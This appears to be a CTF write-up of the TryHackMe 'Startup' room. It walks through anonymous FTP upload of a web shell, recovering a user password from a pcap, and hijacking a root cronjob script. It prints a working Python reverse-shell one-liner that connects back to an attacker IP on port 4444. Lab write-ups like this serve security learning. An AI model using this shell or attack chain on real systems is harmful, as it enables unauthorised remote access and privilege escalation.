Hello, this is Neo. Today we have a CTF Tryhackme - Startup. Let’s go!!!

Firstly, always, I will scan open port. I use rustscan because it faster than nmap, moreover it can integrates with nmap.

I have 3 open port:

  • port 21 with ftp server and I can login by anonymous.
  • port 22 are running ssh on ubuntu server
  • port 80 with Apache httpd 2.4.18 on ubuntu server

In port 21, I have some insteresting here.

In the ftp server I have a txt file and an image file, anonymous users also have the right to edit and write files. So I can upload files to ftp server, I’m not sure. Check out the other 2 files.

I have a name here: Maya. The other picture is nothing special. I will go back to the ftp server to put the shell on and see if it works.

Oke. Now try to check the web path to see if you can find the url of the uploaded file.

Go to path /files and I found ftp file server.

Create listener with configured port inside shell and try to open file.

Oh found it. Reconfigure the shell a bit with python to make it easier to exploit. In the web server file we have a recipe.txt file. Opened this file and I found secret spicy soup recipe.

Go to /home directory and I have user lennie. However, no password is required. I try to check if there is any directory running www-data permission. And I found the incidents folder.

In this there is a pcap file, clone it and try to check with Wireshark to see if you can find anything special, maybe there is Lennie’s password. I create http server with python on remote machine and wget pcap file to my local machine, reply it to Wireshark only.

After a long time of diving, I found the password of user lennie, in the file pcap.

Login and I have user flag.

The next thing is privilege escalation. Along with the user flag I have 2 more folders and the scripts folder contains the executable. I will mine it first. File planner.sh will write a list title to the file startup_list.txt and then execute the file /etc/print.sh. I checked the print.sh file, it is running as user lennie, this means we can edit this file.

I will add reverse shell to this file, but can’t get root. Since this planner.sh file can be run, I will try to check if it is a cronjob running as root. And rightfully so.

So the next thing is to edit this file to call the reverse shell. I will use this shell

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.**.**",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Well, first create a listener.

And I got it. Rooted!
